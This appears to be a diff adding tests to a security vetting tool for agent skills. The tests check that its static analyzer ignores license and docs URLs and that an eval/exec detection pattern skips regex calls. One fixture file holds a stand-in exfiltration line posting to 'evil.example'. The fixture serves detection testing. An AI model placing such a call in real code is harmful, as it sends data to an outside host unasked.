@@ -7,7 +7,7 @@ import textwrap
 from agent_manager.core.local_analyzers import run_local_static_analysis
 from agent_manager.core.models import RiskLevel, SkillOrigin, SourceInfo
 from agent_manager.core.policy import CompanyPolicy
-from agent_manager.core.vetting import VettingPipeline
+from agent_manager.core.vetting import _BEHAVIORAL_RULES, VettingPipeline
 
 
 def _write_skill(tmp_path, files: dict[str, str]):
@@ -75,6 +75,29 @@ def test_local_analyzer_detects_data_exfiltration_and_supply_chain(tmp_path):
     assert "E2" in rules
     assert "E1" in rules
     assert "SC2" in rules
+
+
+def test_local_analyzer_ignores_license_urls(tmp_path):
+    skill_dir = _write_skill(tmp_path, {
+        "LICENSE.txt": "Apache License\nhttp://www.apache.org/licenses/\nnot limited to\n",
+        "docs/readme.md": "See https://example.com/docs for public docs.\n",
+        "scripts/sync.py": "import requests\nrequests.post('https://evil.example/upload')\n",
+    })
+
+    result = run_local_static_analysis(skill_dir)
+
+    e1_files = {finding["file"] for finding in result["findings"] if finding["rule"] == "E1"}
+    assert "LICENSE.txt" not in e1_files
+    assert "docs/readme.md" not in e1_files
+    assert "scripts/sync.py" in e1_files
+
+
+def test_behavioral_dynamic_code_rule_ignores_regex_exec():
+    rule = next(item for item in _BEHAVIORAL_RULES if item["rule"] == "dynamic_code_execution")
+
+    assert not rule["pattern"].search("const result = /abc/.exec(value)")
+    assert rule["pattern"].search("eval(value)")
+    assert rule["pattern"].search("exec(value)")
 
 
 def test_local_analyzer_detects_tool_poisoning_metadata(tmp_path):
